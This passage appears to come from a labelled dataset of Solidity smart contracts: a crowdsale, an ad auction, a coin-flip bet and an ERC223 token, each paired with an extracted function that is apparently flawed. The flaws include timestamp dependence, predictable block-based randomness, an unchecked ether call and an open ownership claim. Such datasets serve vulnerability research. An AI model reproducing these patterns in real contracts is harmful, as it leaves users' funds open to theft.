0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract ArtNoyToken{\n function setCrowdsaleContract (address) public;\n function sendCrowdsaleTokens(address, uint256) public;\n function getOwner()public view returns(address);\n function icoSucceed() public;\n function endIco () public;\n}\ncontract Crowdsale is Ownable, usingOraclize{\n using SafeMath for uint;\n uint public decimals = 18;\n address public distributionAddress;\n uint public startingExchangePrice = 1902877214779731;\n ArtNoyToken public token;\n constructor (address _tokenAddress, address _distributionAddress) public payable{\n require (msg.value > 0);\n token = ArtNoyToken(_tokenAddress);\n techSupport = 0x08531Ea431B6adAa46D2e7a75f48A8d9Ce412FDc;\n token.setCrowdsaleContract(this);\n owner = token.getOwner();\n distributionAddress = _distributionAddress;\n oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n oraclizeBalance = msg.value;\n tokenPrice = startingExchangePrice;\n oraclize_query(\"URL\", \"json(https:\n }\n uint public ethCollected;\n uint public tokensSold;\n uint public minDeposit = 0.01 ether;\n uint public tokenPrice;\n uint public constant PRE_ICO_START = 1528243201;\n uint public constant PRE_ICO_FINISH = 1530403199;\n uint public constant PRE_ICO_MIN_CAP = 0;\n uint public constant PRE_ICO_MAX_CAP = 5000000 ether;\n uint public preIcoTokensSold;\n uint public constant ICO_START = 1530403201;\n uint public constant ICO_FINISH = 1544918399;\n uint public constant ICO_MIN_CAP = 10000 ether;\n uint public constant ICO_MAX_CAP = 55000000 ether;\n mapping (address => uint) contributorsBalances;\n function getCurrentPhase (uint _time) public view returns(uint8){\n if(_time == 0){\n _time = now;\n }\n if (PRE_ICO_START < _time && _time <= PRE_ICO_FINISH){\n return 1;\n }\n if (ICO_START < _time && _time <= ICO_FINISH){\n return 2;\n }\n return 0;\n }\n function getTimeBasedBonus (uint _time) public view returns(uint) {\n if(_time == 0){\n _time = now;\n }\n uint8 phase = getCurrentPhase(_time);\n if(phase == 1){\n return 20;\n }\n if(phase == 2){\n if (ICO_START + 90 days <= _time){\n return 20;\n }\n if (ICO_START + 180 days <= _time){\n return 10;\n }\n if (ICO_START + 365 days <= _time){\n return 5;\n }\n }\n return 0;\n }\n event OnSuccessfullyBuy(address indexed _address, uint indexed _etherValue, bool indexed isBought, uint _tokenValue);\n function () public payable {\n require (msg.value >= minDeposit);\n require (buy(msg.sender, msg.value, now));\n }\n function buy (address _address, uint _value, uint _time) internal returns(bool){\n uint8 currentPhase = getCurrentPhase(_time);\n require (currentPhase != 0);\n uint tokensToSend = calculateTokensWithBonus(_value);\n ethCollected = ethCollected.add(_value);\n tokensSold = tokensSold.add(tokensToSend);\n if (currentPhase == 1){\n require (preIcoTokensSold.add(tokensToSend) <= PRE_ICO_MAX_CAP);\n preIcoTokensSold = preIcoTokensSold.add(tokensToSend);\n distributionAddress.transfer(address(this).balance.sub(oraclizeBalance));\n }else{\n contributorsBalances[_address] = contributorsBalances[_address].add(_value);\n if(tokensSold >= ICO_MIN_CAP){\n if(!areTokensSended){\n token.icoSucceed();\n areTokensSended = true;\n }\n distributionAddress.transfer(address(this).balance.sub(oraclizeBalance));\n }\n }\n emit OnSuccessfullyBuy(_address,_value,true, tokensToSend);\n token.sendCrowdsaleTokens(_address, tokensToSend);\n return true;\n }\n bool public areTokensSended = false;\n function calculateTokensWithoutBonus (uint _value) public view returns(uint) {\n return _value.mul(uint(10).pow(decimals))/(tokenPrice);\n }\n function calculateTokensWithBonus (uint _value) public view returns(uint) {\n uint buffer = _value.mul(uint(10).pow(decimals))/(tokenPrice);\n return buffer.add(buffer.mul(getTimeBasedBonus(now))/100);\n }\n function isIcoTrue () public view returns(bool) {\n if (tokensSold >= ICO_MIN_CAP){\n return true;\n }\n return false;\n }\n function refund () public {\n require (now > ICO_FINISH && !isIcoTrue());\n require (contributorsBalances[msg.sender] != 0);\n uint balance = contributorsBalances[msg.sender];\n contributorsBalances[msg.sender] = 0;\n msg.sender.transfer(balance);\n }\n function manualSendEther (address _address, uint _value) public onlyTechSupport {\n uint tokensToSend = calculateTokensWithBonus(_value);\n ethCollected = ethCollected.add(_value);\n tokensSold = tokensSold.add(tokensToSend);\n token.sendCrowdsaleTokens(_address, tokensToSend);\n emit OnSuccessfullyBuy(_address, 0, false, tokensToSend);\n }\n function manualSendTokens (address _address, uint _value) public onlyTechSupport {\n tokensSold = tokensSold.add(_value);\n token.sendCrowdsaleTokens(_address, _value);\n emit OnSuccessfullyBuy(_address, 0, false, _value);\n }\n event IcoEnded();\n function endIco () public onlyOwner {\n require (now > ICO_FINISH);\n token.endIco();\n emit IcoEnded();\n }\n uint public oraclizeBalance;\n bool public updateFlag = true;\n uint public priceUpdateAt;\n function update() internal {\n oraclize_query(86400,\"URL\", \"json(https:\n oraclizeBalance = oraclizeBalance.sub(oraclize_getPrice(\"URL\"));\n }\n function startOraclize (uint _time) public onlyOwner {\n require (_time != 0);\n require (!updateFlag);\n updateFlag = true;\n oraclize_query(_time,\"URL\", \"json(https:\n oraclizeBalance = oraclizeBalance.sub(oraclize_getPrice(\"URL\"));\n }\n function addEtherForOraclize () public payable {\n oraclizeBalance = oraclizeBalance.add(msg.value);\n }\n function requestOraclizeBalance () public onlyOwner {\n updateFlag = false;\n if (address(this).balance >= oraclizeBalance){\n owner.transfer(oraclizeBalance);\n }else{\n owner.transfer(address(this).balance);\n }\n oraclizeBalance = 0;\n }\n function stopOraclize () public onlyOwner {\n updateFlag = false;\n }\n function __callback(bytes32, string result, bytes) public {\n require(msg.sender == oraclize_cbAddress());\n uint256 price = 10 ** 23 / parseInt(result, 5);\n require(price > 0);\n tokenPrice = price;\n priceUpdateAt = block.timestamp;\n if(updateFlag){\n update();\n }\n }\n}",
  "extract_feature": [
    "function __callback(bytes32, string result, bytes) public {\nrequire(msg.sender == oraclize_cbAddress());\nuint256 price = 10 ** 23 / parseInt(result, 5);\nrequire(price > 0);\ntokenPrice = price;\npriceUpdateAt = block.timestamp;\nif(updateFlag){\nupdate();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f8f"
  },
  "filename": "9560.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract dappVolumeAd {\nusing SafeMath for uint256;\n uint256 public dappId;\n uint256 public purchaseTimestamp;\n uint256 public purchaseSeconds;\n uint256 public investmentMin;\n uint256 public adPriceHour;\n uint256 public adPriceHalfDay;\n uint256 public adPriceDay;\n uint256 public adPriceWeek;\n uint256 public adPriceMultiple;\n address public contractOwner;\n address public lastOwner;\n address public theInvestor;\n modifier onlyContractOwner {\n require(msg.sender == contractOwner);\n _;\n }\n constructor() public {\n investmentMin = 1000000000000000;\n adPriceHour = 5000000000000000;\n adPriceHalfDay = 50000000000000000;\n adPriceDay = 100000000000000000;\n adPriceWeek = 500000000000000000;\n adPriceMultiple = 1;\n contractOwner = msg.sender;\n theInvestor = contractOwner;\n lastOwner = contractOwner;\n }\n function withdraw() public onlyContractOwner {\n contractOwner.transfer(address(this).balance);\n }\n function setAdPriceMultiple(uint256 amount) public onlyContractOwner {\n adPriceMultiple = amount;\n }\n function updateAd(uint256 id) public payable {\n require(msg.value >= adPriceMultiple.mul(adPriceHour));\n require(block.timestamp > purchaseTimestamp + purchaseSeconds);\n require(id > 0);\n if (msg.value >= adPriceMultiple.mul(adPriceWeek)) {\n purchaseSeconds = 604800;\n } else if (msg.value >= adPriceMultiple.mul(adPriceDay)) {\n purchaseSeconds = 86400;\n } else if (msg.value >= adPriceMultiple.mul(adPriceHalfDay)) {\n purchaseSeconds = 43200;\n } else {\n purchaseSeconds = 3600;\n }\n purchaseTimestamp = block.timestamp;\n lastOwner.transfer(msg.value.div(2));\n theInvestor.transfer(msg.value.div(10));\n lastOwner = msg.sender;\n dappId = id;\n }\n function updateInvestor() public payable {\n require(msg.value >= investmentMin);\n theInvestor.transfer(msg.value.div(100).mul(60));\n theInvestor = msg.sender;\n investmentMin = investmentMin.mul(2);\n }\n function getPurchaseTimestampEnds() public view returns (uint _getPurchaseTimestampAdEnds) {\n return purchaseTimestamp.add(purchaseSeconds);\n }\n function getBalance() public view returns(uint256){\n return address(this).balance;\n }\n}",
  "extract_feature": [
    "function updateAd(uint256 id) public payable {\nrequire(msg.value >= adPriceMultiple.mul(adPriceHour));\nrequire(block.timestamp > purchaseTimestamp + purchaseSeconds);\nrequire(id > 0);\nif (msg.value >= adPriceMultiple.mul(adPriceWeek)) {\npurchaseSeconds = 604800;\n} else if (msg.value >= adPriceMultiple.mul(adPriceDay)) {\npurchaseSeconds = 86400;\n} else if (msg.value >= adPriceMultiple.mul(adPriceHalfDay)) {\npurchaseSeconds = 43200;\n} else {\npurchaseSeconds = 3600;\n}\npurchaseTimestamp = block.timestamp;\nlastOwner.transfer(msg.value.div(2));\ntheInvestor.transfer(msg.value.div(10));\nlastOwner = msg.sender;\ndappId = id;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f90"
  },
  "filename": "9654.sol",
  "content": "pragma solidity ^0.4.24;\ncontract SimpleBet {\n address gameOwner = address(0);\n bool locked = false;\n function bet() payable\n {\n if ((random()%2==1) && (msg.value == 1 ether) && (!locked))\n {\n if (!msg.sender.call.value(2 ether)())\n throw;\n }\n }\n function lock()\n {\n if (gameOwner==msg.sender)\n {\n locked = true;\n }\n }\n function unlock()\n {\n if (gameOwner==msg.sender)\n {\n locked = false;\n }\n }\n function own(address owner)\n {\n if ((gameOwner == address(0)) || (gameOwner == msg.sender))\n {\n gameOwner = owner;\n }\n }\n function releaseFunds(uint amount)\n {\n if (gameOwner==msg.sender)\n {\n msg.sender.transfer( amount * (1 ether));\n }\n }\n function random() view returns (uint8) {\n return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);\n }\n function () public payable\n {\n bet();\n }\n}",
  "extract_feature": [
    "function random() view returns (uint8) {\nreturn uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f91"
  },
  "filename": "9695.sol",
  "content": "contract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address _to, uint _value, bytes _data) public returns (bool);\n event Transfer(address indexed _from, address indexed _to, uint256 indexed _value, bytes _data);\n}\nlibrary BytesLib {\n function concat(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes) {\n bytes memory tempBytes;\n assembly {\n tempBytes := mload(0x40)\n let length := mload(_preBytes)\n mstore(tempBytes, length)\n let mc := add(tempBytes, 0x20)\n let end := add(mc, length)\n for {\n let cc := add(_preBytes, 0x20)\n } lt(mc, end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n length := mload(_postBytes)\n mstore(tempBytes, add(length, mload(tempBytes)))\n mc := end\n end := add(mc, length)\n for {\n let cc := add(_postBytes, 0x20)\n } lt(mc, end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n mstore(0x40, and(\n add(add(end, iszero(add(length, mload(_preBytes)))), 31),\n not(31)\n ))\n }\n return tempBytes;\n }\n function concatStorage(bytes storage _preBytes, bytes memory _postBytes) internal {\n assembly {\n let fslot := sload(_preBytes_slot)\n let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n let mlength := mload(_postBytes)\n let newlength := add(slength, mlength)\n switch add(lt(slength, 32), lt(newlength, 32))\n case 2 {\n sstore(\n _preBytes_slot,\n add(\n fslot,\n add(\n mul(\n div(\n mload(add(_postBytes, 0x20)),\n exp(0x100, sub(32, mlength))\n ),\n exp(0x100, sub(32, newlength))\n ),\n mul(mlength, 2)\n )\n )\n )\n }\n case 1 {\n mstore(0x0, _preBytes_slot)\n let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n let submod := sub(32, slength)\n let mc := add(_postBytes, submod)\n let end := add(_postBytes, mlength)\n let mask := sub(exp(0x100, submod), 1)\n sstore(\n sc,\n add(\n and(\n fslot,\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00\n ),\n and(mload(mc), mask)\n )\n )\n for {\n mc := add(mc, 0x20)\n sc := add(sc, 1)\n } lt(mc, end) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n sstore(sc, mload(mc))\n }\n mask := exp(0x100, sub(mc, end))\n sstore(sc, mul(div(mload(mc), mask), mask))\n }\n default {\n mstore(0x0, _preBytes_slot)\n let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n let slengthmod := mod(slength, 32)\n let mlengthmod := mod(mlength, 32)\n let submod := sub(32, slengthmod)\n let mc := add(_postBytes, submod)\n let end := add(_postBytes, mlength)\n let mask := sub(exp(0x100, submod), 1)\n sstore(sc, add(sload(sc), and(mload(mc), mask)))\n for {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } lt(mc, end) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n sstore(sc, mload(mc))\n }\n mask := exp(0x100, sub(mc, end))\n sstore(sc, mul(div(mload(mc), mask), mask))\n }\n }\n }\n function slice(bytes _bytes, uint _start, uint _length) internal pure returns (bytes) {\n require(_bytes.length >= (_start + _length));\n bytes memory tempBytes;\n assembly {\n switch iszero(_length)\n case 0 {\n tempBytes := mload(0x40)\n let lengthmod := and(_length, 31)\n let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n let end := add(mc, _length)\n for {\n let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n } lt(mc, end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n mstore(tempBytes, _length)\n mstore(0x40, and(add(mc, 31), not(31)))\n }\n default {\n tempBytes := mload(0x40)\n mstore(0x40, add(tempBytes, 0x20))\n }\n }\n return tempBytes;\n }\n function toAddress(bytes _bytes, uint _start) internal pure returns (address) {\n require(_bytes.length >= (_start + 20));\n address tempAddress;\n assembly {\n tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)\n }\n return tempAddress;\n }\n function toUint(bytes _bytes, uint _start) internal pure returns (uint256) {\n require(_bytes.length >= (_start + 32));\n uint256 tempUint;\n assembly {\n tempUint := mload(add(add(_bytes, 0x20), _start))\n }\n return tempUint;\n }\n function toBytes32(bytes _bytes, uint _start) internal pure returns (bytes32) {\n require(_bytes.length >= (_start + 32));\n bytes32 tempBytes32;\n assembly {\n tempBytes32 := mload(add(add(_bytes, 0x20), _start))\n }\n return tempBytes32;\n }\n function toBytes16(bytes _bytes, uint _start) internal pure returns (bytes16) {\n require(_bytes.length >= (_start + 16));\n bytes16 tempBytes16;\n assembly {\n tempBytes16 := mload(add(add(_bytes, 0x20), _start))\n }\n return tempBytes16;\n }\n function toBytes2(bytes _bytes, uint _start) internal pure returns (bytes2) {\n require(_bytes.length >= (_start + 2));\n bytes2 tempBytes2;\n assembly {\n tempBytes2 := mload(add(add(_bytes, 0x20), _start))\n }\n return tempBytes2;\n }\n function toBytes4(bytes _bytes, uint _start) internal pure returns (bytes4) {\n require(_bytes.length >= (_start + 4));\n bytes4 tempBytes4;\n assembly {\n tempBytes4 := mload(add(add(_bytes, 0x20), _start))\n }\n return tempBytes4;\n }\n function toBytes1(bytes _bytes, uint _start) internal pure returns (bytes1) {\n require(_bytes.length >= (_start + 1));\n bytes1 tempBytes1;\n assembly {\n tempBytes1 := mload(add(add(_bytes, 0x20), _start))\n }\n return tempBytes1;\n }\n function equal(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bool) {\n bool success = true;\n assembly {\n let length := mload(_preBytes)\n switch eq(length, mload(_postBytes))\n case 1 {\n let cb := 1\n let mc := add(_preBytes, 0x20)\n let end := add(mc, length)\n for {\n let cc := add(_postBytes, 0x20)\n } eq(add(lt(mc, end), cb), 2) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n if iszero(eq(mload(mc), mload(cc))) {\n success := 0\n cb := 0\n }\n }\n }\n default {\n success := 0\n }\n }\n return success;\n }\n function equalStorage(bytes storage _preBytes, bytes memory _postBytes) internal view returns (bool) {\n bool success = true;\n assembly {\n let fslot := sload(_preBytes_slot)\n let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n let mlength := mload(_postBytes)\n switch eq(slength, mlength)\n case 1 {\n if iszero(iszero(slength)) {\n switch lt(slength, 32)\n case 1 {\n fslot := mul(div(fslot, 0x100), 0x100)\n if iszero(eq(fslot, mload(add(_postBytes, 0x20)))) {\n success := 0\n }\n }\n default {\n let cb := 1\n mstore(0x0, _preBytes_slot)\n let sc := keccak256(0x0, 0x20)\n let mc := add(_postBytes, 0x20)\n let end := add(mc, mlength)\n for {} eq(add(lt(mc, end), cb), 2) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n if iszero(eq(sload(sc), mload(mc))) {\n success := 0\n cb := 0\n }\n }\n }\n }\n }\n default {\n success := 0\n }\n }\n return success;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract DateTime {\n struct _DateTime {\n uint16 year;\n uint8 month;\n uint8 day;\n uint8 hour;\n uint8 minute;\n uint8 second;\n uint8 weekday;\n }\n uint constant DAY_IN_SECONDS = 86400;\n uint constant YEAR_IN_SECONDS = 31536000;\n uint constant LEAP_YEAR_IN_SECONDS = 31622400;\n uint constant HOUR_IN_SECONDS = 3600;\n uint constant MINUTE_IN_SECONDS = 60;\n uint16 constant ORIGIN_YEAR = 1970;\n function isLeapYear(uint16 year) public pure returns (bool) {\n if (year % 4 != 0) {\n return false;\n }\n if (year % 100 != 0) {\n return true;\n }\n if (year % 400 != 0) {\n return false;\n }\n return true;\n }\n function leapYearsBefore(uint year) public pure returns (uint) {\n year -= 1;\n return year / 4 - year / 100 + year / 400;\n }\n function getDaysInMonth(uint8 month, uint16 year) public pure returns (uint8) {\n if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n return 31;\n }\n else if (month == 4 || month == 6 || month == 9 || month == 11) {\n return 30;\n }\n else if (isLeapYear(year)) {\n return 29;\n }\n else {\n return 28;\n }\n }\n function parseTimestamp(uint timestamp) internal pure returns (_DateTime dt) {\n uint secondsAccountedFor = 0;\n uint buf;\n uint8 i;\n dt.year = getYear(timestamp);\n buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;\n secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);\n uint secondsInMonth;\n for (i = 1; i <= 12; i++) {\n secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);\n if (secondsInMonth + secondsAccountedFor > timestamp) {\n dt.month = i;\n break;\n }\n secondsAccountedFor += secondsInMonth;\n }\n for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {\n if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {\n dt.day = i;\n break;\n }\n secondsAccountedFor += DAY_IN_SECONDS;\n }\n dt.hour = getHour(timestamp);\n dt.minute = getMinute(timestamp);\n dt.second = getSecond(timestamp);\n dt.weekday = getWeekday(timestamp);\n }\n function getYear(uint timestamp) public pure returns (uint16) {\n uint secondsAccountedFor = 0;\n uint16 year;\n uint numLeapYears;\n year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);\n numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;\n secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);\n while (secondsAccountedFor > timestamp) {\n if (isLeapYear(uint16(year - 1))) {\n secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;\n }\n else {\n secondsAccountedFor -= YEAR_IN_SECONDS;\n }\n year -= 1;\n }\n return year;\n }\n function getMonth(uint timestamp) public pure returns (uint8) {\n return parseTimestamp(timestamp).month;\n }\n function getDay(uint timestamp) public pure returns (uint8) {\n return parseTimestamp(timestamp).day;\n }\n function getHour(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / 60 / 60) % 24);\n }\n function getMinute(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / 60) % 60);\n }\n function getSecond(uint timestamp) public pure returns (uint8) {\n return uint8(timestamp % 60);\n }\n function getWeekday(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, 0, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, hour, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, hour, minute, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) public pure returns (uint timestamp) {\n uint16 i;\n for (i = ORIGIN_YEAR; i < year; i++) {\n if (isLeapYear(i)) {\n timestamp += LEAP_YEAR_IN_SECONDS;\n }\n else {\n timestamp += 